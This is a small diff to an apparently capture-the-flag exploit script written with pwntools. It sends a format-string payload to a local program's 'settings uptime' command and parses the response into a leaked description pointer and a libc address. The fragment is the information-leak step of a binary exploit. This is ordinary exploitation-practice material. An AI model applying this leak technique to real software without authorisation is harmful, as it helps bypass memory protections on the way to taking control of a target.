@@ -19,7 +19,10 @@ p = process(fileName)
 p.recvuntil(b'Exit\n')
 p.sendline('settings uptime %10$p %11$p')
 p.sendline('info uptime\n')
-p.recvuntil(b'updated.\n')
-leaks = p.recvline()
-print(f"LEAKS {leaks}")
+p.recvuntil(b'updated.\n> ')
+leaks = p.recvline().decode()
+leakedAddresses = leaks.split()
+descriptionLeak = leakedAddresses[0]
+libcLeak = leakedAddresses[1].partition('>')[0] # removes that >
+print(f"Desc leak = {descriptionLeak} libcLeak = {libcLeak}")
 p.interactive()
